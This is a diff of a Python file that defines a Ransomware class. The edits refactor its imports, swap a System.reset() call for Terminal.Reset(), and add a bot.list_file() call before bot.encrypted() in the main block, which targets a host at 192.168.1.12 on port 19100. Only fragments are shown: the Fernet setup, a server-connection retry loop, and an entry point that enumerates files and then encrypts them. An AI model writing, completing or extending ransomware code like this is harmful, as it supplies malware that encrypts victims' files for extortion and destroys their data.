@@ -6,13 +6,15 @@ import shutil
 from time import sleep
 from pathlib import Path
 from typing import Dict, List
-from lib.modules.terminal import System
-from lib.modules.yaml import safe_load
-from lib.cryptography.fernet import Fernet
+from lib.modules import (
+    Terminal,
+    safe_load
+)
+from lib.cryptography import Fernet
 
 
-class Ransomware():
-    
+
+class Ransomware:
     def __init__(
         self, 
         host: str, 
@@ -23,7 +25,6 @@ class Ransomware():
         self.host = host
         self.port = port
         self.Private = Fernet(self.key)
-        self.file_categories = {'code': ['scripts/extensions.yaml']}
 
     def ConnectServer(self, connected = False) -> None:
         retries = 0
@@ -37,7 +38,7 @@ class Ransomware():
                 if retries < 3:
                     sleep(10)
                 else:
-                    System.reset()
+                    Terminal.Reset()
             finally:
                 self.server.close()
 
@@ -83,4 +84,5 @@ class Ransomware():
 
 if __name__ == '__main__':
     bot = Ransomware('192.168.1.12', 19100)
+    bot.list_file()
     bot.encrypted()
